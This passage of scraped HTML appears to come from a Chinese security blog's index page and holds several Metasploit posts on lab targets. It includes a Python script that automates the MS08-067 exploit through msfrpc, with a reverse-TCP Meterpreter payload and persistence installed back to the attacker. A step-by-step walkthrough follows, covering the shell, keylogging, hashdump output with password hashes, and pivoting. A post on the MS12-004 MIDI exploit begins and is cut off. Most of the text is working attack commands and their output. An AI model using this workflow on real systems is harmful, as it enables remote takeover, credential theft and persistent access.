"""</div><div class="line">    batcomm = <span class="string">"ms08067_patch.exe /quiet"</span></div><div class="line">    <span class="keyword">with</span> open (<span class="string">'/tmp/smbpost.rc'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> post, open(<span class="string">'/tmp/ms08067_install.bat'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> bat:</div><div class="line">        post.write(postcomms)</div><div class="line">        bat.write(batcomm)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sploiter</span><span class="params">(RHOST, LHOST, LPORT, session)</span>:</span></div><div class="line">    <span class="string">'''连接到msfconsole</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line">    :param session: session</div><div class="line"></div><div class="line">    '''</div><div class="line">    client = msfrpc.Msfrpc(&#123;&#125;)</div><div class="line">    client.login(LOGIN, PASSWD)</div><div class="line">    ress = client.call(<span class="string">'console.create'</span>)</div><div class="line">    console_id = ress[<span class="string">'id'</span>]</div><div class="line"></div><div class="line">    <span class="comment"># Exploit MS08-067</span></div><div class="line">    commands = <span class="string">"""use exploit/windows/smb/ms08_067_netapi</span></div><div class="line">                set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">                set RHOST """+RHOST+<span class="string">"""</span></div><div class="line">                set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">                set LPORT """+LPORT+<span class="string">"""</span></div><div class="line">                set ExitOnSession false</div><div class="line">                exploit -z</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Exploiting MS08-067 on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,commands])</div><div class="line">    res = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    result = res[<span class="string">'data'</span>].split(<span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 运行攻击脚本</span></div><div class="line">    runPost = <span class="string">"""use post/multi/gather/run_console_rc_file</span></div><div class="line">                set RESOURCE /tmp/smbpost.rc</div><div class="line">                set SESSION """+session+<span class="string">"""</span></div><div class="line">                exploit</div><div class="line">              """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Running post-exploit script on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,runPost])</div><div class="line">    rres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line"></div><div class="line">    <span class="comment">#Setup Listener for presistent connection back over port 80</span></div><div class="line">    sleep(<span class="number">10</span>)</div><div class="line">    listen = <span class="string">"""use exploit/multi/handler</span></div><div class="line">            set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">            set LPORT 80</div><div class="line">            set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">            exploit</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Setting up listener on: "</span> + LHOST + <span class="string">":80"</span></div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,listen])</div><div class="line">    lres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    <span class="keyword">print</span> lres</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser = optparse.OptionParser(sys.argv[<span class="number">0</span>] +\</div><div class="line">            <span class="string">' -p LPORT -r RHOST -l LHOST -s session'</span>)</div><div class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'LPORT'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify a port to listen on'</span>)</div><div class="line">    parser.add_option(<span class="string">'-r'</span>, dest=<span class="string">'RHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a remote host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-l'</span>, dest=<span class="string">'LHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a local host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-s'</span>, dest=<span class="string">'session'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify session ID'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    session=options.session</div><div class="line">    RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (RHOST == <span class="keyword">None</span>) <span class="keyword">and</span> (LPORT == <span class="keyword">None</span>) <span class="keyword">and</span> (LHOST == <span class="keyword">None</span>):</div><div class="line">        <span class="keyword">print</span> parser.usage</div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    builder(RHOST, LHOST, LPORT)</div><div class="line">    sploiter(RHOST, LHOST, LPORT, session)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h1 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  ~  python 333msf.py -p 4444 -r 192.168.1.43 <span class="_">-l</span> 192.168.1.8 <span class="_">-s</span> 8</div><div class="line">[+] Exploiting MS08-067 on: 192.168.1.43</div><div class="line">[+] Running post-exploit script on: 192.168.1.43</div><div class="line">[+] Setting up listener on: 192.168.1.8:80</div><div class="line">[&#123;<span class="string">"prompt"</span>: <span class="string">"\u0001\u0002msf\u0001\u0002 post(\u0001\u0002\u0001\u0002run_console_rc_file\u0001\u0002) \u0001\u0002&gt; "</span>, <span class="string">"busy"</span>: <span class="literal">true</span>, <span class="string">"data"</span>: <span class="string">"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\nRHOST =&gt; 192.168.1.43\nLHOST =&gt; 192.168.1.8\nLPORT =&gt; 4444\nExitOnSession =&gt; false\n[*] Started reverse TCP handler on 192.168.1.8:4444 \n[*] Automatically detecting the target...\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability...\n[*] Sending stage (957487 bytes) to 192.168.1.43\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\n[*] Session 8 created in the background.\nRESOURCE =&gt; /tmp/smbpost.rc\nSESSION =&gt; 7\n[*] Running module against DH-CA8822AB9589\n[*] Running command getsystem\n[*] Running command                 run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\n"</span>&#125;]</div></pre></td></tr></table></figure>
+<h1 id="执行脚本时msf端命令行回显"><a href="#执行脚本时msf端命令行回显" class="headerlink" title="执行脚本时msf端命令行回显"></a>执行脚本时msf端命令行回显</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[*] Running Persistance Script</div><div class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc</div><div class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80</div><div class="line">[*] Persistent agent script is 148419 bytes long</div><div class="line">[+] Persistent Script written to C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[*] Executing script C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[+] Agent executed with PID 2720</div><div class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[*] Installing as service..</div><div class="line">[*] Creating service YsimPwZAk</div><div class="line">[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800</div></pre></td></tr></table></figure>
+<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  7   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43)</div><div class="line">  8   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ DH-CA8822AB9589            192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; sessions -i 8</div><div class="line">[*] Starting interaction with 6...</div></pre></td></tr></table></figure>
+<h1 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div><div class="line">meterpreter &gt; shell</div><div class="line">Process 3492 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Demo-MSF检测指定服务的漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Test-MS08-067" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Test-MS08-067/">Test-MS08-067</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Test-MS08-067/" class="archive-article-date">
+  	<time datetime="2016-08-10T13:44:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Kali2.0</div><div class="line">192.168.1.8</div><div class="line">W<span class="keyword">in</span>XPenSP3</div><div class="line">192.168.1.43</div></pre></td></tr></table></figure>
+<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapi</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
+<h1 id="Show-Option"><a href="#Show-Option" class="headerlink" title="Show Option"></a>Show Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/smb/ms08_067_netapi):</div><div class="line"></div><div class="line">   Name     Current Setting  Required  Description</div><div class="line">   ----     ---------------  --------  -----------</div><div class="line">   RHOST                     yes       The target address</div><div class="line">   RPORT    445              yes       Set the SMB service port</div><div class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</div><div class="line"></div><div class="line"></div><div class="line">Payload options (windows/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</div><div class="line">   LHOST                      yes       The listen address</div><div class="line">   LPORT     4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic Targeting</div></pre></td></tr></table></figure>
+<h1 id="Set-Option"><a href="#Set-Option" class="headerlink" title="Set Option"></a>Set Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> RhOST 192.168.1.43</div><div class="line">RhOST =&gt; 192.168.1.43</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> LHOST 192.168.1.8</div><div class="line">LHOST =&gt; 192.168.1.8</div></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; exploit</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:4444</div><div class="line">[*] Automatically detecting the target...</div><div class="line">[*] Fingerprint: Windows XP - Service Pack 3 - lang:English</div><div class="line">[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)</div><div class="line">[*] Attempting to trigger the vulnerability...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800</div><div class="line"></div><div class="line">meterpreter &gt; ls</div><div class="line">Listing: C:\WINDOWS\system32</div><div class="line">============================</div><div class="line"></div><div class="line">Mode              Size      Type  Last modified              Name</div><div class="line">----              ----      ----  -------------              ----</div><div class="line">100666/rw-rw-rw-  1482      fil   2011-08-14 13:40:01 +0800  <span class="variable">$winnt</span>$.inf</div><div class="line">40777/rwxrwxrwx   0         dir   2011-08-14 21:19:31 +0800  1025</div></pre></td></tr></table></figure>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 1004 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;</div></pre></td></tr></table></figure>
+<h1 id="常用手法"><a href="#常用手法" class="headerlink" title="常用手法"></a>常用手法</h1><h2 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; screenshot</div><div class="line">Screenshot saved to: /root/Fyjiynwg.jpeg</div></pre></td></tr></table></figure>
+<h2 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div></pre></td></tr></table></figure>
+<h2 id="目标系统正在运行的进程"><a href="#目标系统正在运行的进程" class="headerlink" title="目标系统正在运行的进程"></a>目标系统正在运行的进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; ps</div><div class="line"></div><div class="line">Process List</div><div class="line">============</div><div class="line"></div><div class="line"> PID   PPID  Name                  Arch  Session  User                           Path</div><div class="line"> ---   ----  ----                  ----  -------  ----                           ----</div><div class="line"> 0     0     [System Process]                                                    </div><div class="line"> 4     0     System                x86   0        NT AUTHORITY\SYSTEM            </div><div class="line"> 128   676   VMUpgradeHelper.exe   x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe</div><div class="line"> 560   4     smss.exe              x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe</div></pre></td></tr></table></figure>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><blockquote>
+<p>使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; migrate 1652</div><div class="line">[*] Migrating from 1032 to 1652...</div><div class="line">[*] Migration completed successfully.</div><div class="line">meterpreter &gt; run post/windows/capture/keylog_recorder</div><div class="line"></div><div class="line">[*] Executing module against DH-CA8822AB9589</div><div class="line">[*] Starting the keystroke sniffer...</div><div class="line">[*] Keystrokes being saved <span class="keyword">in</span> to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt</div><div class="line">[*] Recording keystrokes...</div><div class="line">^C[*] Saving last few keystrokes...</div><div class="line">[*] Interrupt</div><div class="line">[*] Stopping keystroke sniffer...</div></pre></td></tr></table></figure>
+<h2 id="获取密码哈希值"><a href="#获取密码哈希值" class="headerlink" title="获取密码哈希值"></a>获取密码哈希值</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; hashdump</div><div class="line">Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</div><div class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div class="line">HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::</div><div class="line">IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::</div><div class="line">IWAM_DH-CA8822AB9589:1004:90b05d38a1<span class="built_in">fc</span>8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::</div><div class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::</div><div class="line">meterprete</div></pre></td></tr></table></figure>
+<h2 id="将目标机器作为跳板"><a href="#将目标机器作为跳板" class="headerlink" title="将目标机器作为跳板"></a>将目标机器作为跳板</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run get_local_subnets</div><div class="line">Local subnet: 192.168.1.0/255.255.255.0</div><div class="line">meterpreter &gt; background</div><div class="line">[*] Backgrounding session 1...</div><div class="line">msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1</div><div class="line">[*] Route added</div><div class="line">msf exploit(ms08_067_netapi) &gt; route <span class="built_in">print</span></div><div class="line"></div><div class="line">Active Routing Table</div><div class="line">====================</div><div class="line"></div><div class="line">   Subnet             Netmask            Gateway</div><div class="line">   ------             -------            -------</div><div class="line">   192.168.3.0        255.255.255.0      Session 1</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Test-MS08-067/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Metasploit-MIDI文件解析远程代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Metasploit-MIDI文件解析远程代码执行/">Metasploit-MIDI文件解析远程代码执行</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Metasploit-MIDI文件解析远程代码执行/" class="archive-article-date">
+  	<time datetime="2016-08-09T14:40:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[*] Processing setup.rc <span class="keyword">for</span> ERB directives.</div><div class="line">resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msf</div><div class="line">resource (setup.rc)&gt; load msgrpc User=msf Pass=<span class="string">'abc123'</span></div><div class="line">[*] MSGRPC Service:  127.0.0.1:55552</div><div class="line">[*] MSGRPC Username: msf</div><div class="line">[*] MSGRPC Password: abc123</div><div class="line">[*] Successfully loaded plugin: msgrpc</div></pre></td></tr></table></figure>
+<h1 id="搜索和使用漏洞模块"><a href="#搜索和使用漏洞模块" class="headerlink" title="搜索和使用漏洞模块"></a>搜索和使用漏洞模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">msf &gt; search 12-004</div><div class="line">[!] Module database cache not built yet, using slow search</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                   Disclosure Date  Rank    Description</div><div class="line">   ----                                   ---------------  ----    -----------</div><div class="line">   exploit/windows/browser/ms12_004_midi  2012-01-10       normal  MS12-004 midiOutPlayNextPolyEvent Heap Overflow</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; use exploit/windows/browser/ms12_004_midi</div></pre></td></tr></table></figure>
+<h1 id="显示和设置相关Option"><a href="#显示和设置相关Option" class="headerlink" title="显示和设置相关Option"></a>显示和设置相关Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms12_004_midi) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/browser/ms12_004_midi):</div><div class="line"></div><div class="line">   Name       Current Setting  Required  Description</div><div class="line">   ----       ---------------  --------  -----------</div><div class="line">   OBFUSCATE  <span class="literal">false</span>            no        Enable JavaScript obfuscation</div><div class="line">   SRVHOST    0.0.0.0          yes       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</div><div class="line">   SRVPORT    8080             yes       The <span class="built_in">local</span> port to listen on.</div><div class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</div><div class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</div><div class="line">   URIPATH                     no        The URI to use <span class="keyword">for</span> this exploit (default is random)</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line"></div><div class="line">msf 